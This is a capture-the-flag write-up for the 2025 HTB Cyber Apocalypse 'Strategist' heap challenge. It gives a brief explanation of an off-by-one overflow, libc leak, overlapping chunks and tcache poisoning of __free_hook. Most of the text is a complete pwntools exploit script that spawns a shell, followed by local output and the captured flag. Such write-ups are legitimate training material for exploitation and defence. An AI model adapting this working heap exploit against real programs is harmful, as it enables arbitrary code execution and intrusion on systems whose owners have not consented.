# 2025 HTB Cyber Apocalypse - Strategist

Classic heap challenge with CRUD for plans. The binary had off-by-one vulnerability which enabled us to overwrite into the size of the next chunk. We utilize this first to perform libc and heap leak (heap leak was actually not needed) and afterwards achieve overlapping chunks. Once chunks overlap we perform the tcache poisoning technique as described in how2heap. The glibc was identified as 2.27 by inputting offsets into the libc database.

```
from pwn import *

def create(r, length: bytes, content: bytes):
    r.sendline(b"1")
    r.recvuntil(b"> ")
    r.sendline(length)
    r.recvuntil(b"> ")
    r.sendline(content)
    r.recvuntil(b"> ")

def show(r, which: bytes):
    r.sendline(b"2")
    r.recvuntil(b"> ")
    r.sendline(which)
    r.recvline()
    result = r.recvuntil(b"+-----------------+").strip()
    r.recvuntil(b"> ")
    return result.splitlines()

def edit(r, which: bytes, content: bytes):
    r.sendline(b"3")
    r.recvuntil(b"> ")
    r.sendline(which)
    r.recvuntil(b"> ")
    r.sendline(content)
    r.recvuntil(b"> ")

def delete(r, which: bytes):
    r.sendline(b"4")
    r.recvuntil(b"> ")
    r.sendline(which)
    r.recvuntil(b"> ")

libc = ELF('./glibc/libc.so.6')

r = process("./strategist")
#r = gdb.debug("./strategist", '''
#set follow-fork-mode child
#''')

r.recvuntil(b"> ")

# leak libc addr
# ---
# create 3 chunks
create(r, b"1064", b"")
create(r, b"56", b"")
create(r, b"56", b"")
# we delete the set of 3 to populate fd and bk pointers
delete(r, b"0")
delete(r, b"2")
delete(r, b"1")
# reallocate by pulling the first chunk back and do not write anything
# the fd and bk pointers will stay "intact" (not really but good enough)
create(r, b"1064", b"") #0
# show the pointers
_, libc_leak, _ = show(r, b"0")
# get libc base
libc.address = int.from_bytes(b"\x00" + libc_leak, 'little') - 0x3ebc00
print(libc_leak, hex(libc.address))

# leak heap addr (not really needed)
# ---
# now reallocate second chunk and leave it blank
# second chunk points to the first chunk
create(r, b"56", b"") #1
# leak the first chunk addr
_, heap_leak, _ = show(r, b"1")
# calculate heap base
heap_addr = int.from_bytes(b"\x00" + heap_leak, 'little') - 0xa00
print(heap_leak, hex(heap_addr))

# delete everything
delete(r, b"0")
delete(r, b"1")

# off-by-one
# ---
# create a new set of adjacent chunks 
# first to use to overflow the second
create(r, b"1288", b"B"*1287) #0
# second to overflow
create(r, b"2568", b"C"*2544 + p64(0xa08)*2 + b"\x08") #1, fd/bk at 0x60 and len 0x10, 
# third to overlap
create(r, b"1288", b"D"*1287)   #2
# fourth to prevent consolidation
create(r, b"1100", b"E"*1099)   #3

# delete second
delete(r, b"1")
# overflow into the second which is now deleted
edit(r, b"0", b"B"*1280 + p64(0x510))
create(r, b"1288", b"") #again 1
create(r, b"1152", b"b"*1151) # 4
delete(r, b"1")
delete(r, b"2")

# tcache poisoning
# ---
# load tcache
create(r, b"88", b"t"*87) #again 1
delete(r, b"1") #into tcache
#overwrite
create(r, b"3072", b"d"*0x508 + p64(0x61) + p64(libc.sym.__free_hook-0x18) + p64(libc.sym.__free_hook-0x10)) #again 1
# at this point chunk 1 and 4 overlap
delete(r, b"4") #into tcache
#overwrite tcache
delete(r, b"1")
create(r, b"3072", b"d"*0x508 + p64(0x61) + p64(libc.sym.__free_hook)) #again 1
create(r, b"88", b"t"*87) #first chunk at 4
create(r, b"88", p64(libc.address+0x4f432)) #second chunk at 5
# trigger free
r.sendline(b"4")
r.recvuntil(b"> ")
r.sendline(b"4")

r.interactive()
```

Local execution:
```
$ python3 xpl.py 
[*] '/home/vm/Documents/htbctf/pwn_strategist/glibc/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Starting local process './strategist': pid 11360
b'\xbc>l>\x7f' 0x7f3e6c000000
b'\x8a7\xd1\xbeU' 0x55bed1378000
[*] Switching to interactive mode
$ id
uid=1000(vm) gid=1000(vm) groups=1000(vm),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
$ 
[*] Interrupted
[*] Stopped process './strategist' (pid 11360)
```

```
HTB{0ld_r3l14bl3_l1bc_st1ll_3x15t5_9dbaba33a5823a302e692234518c7e18}
```
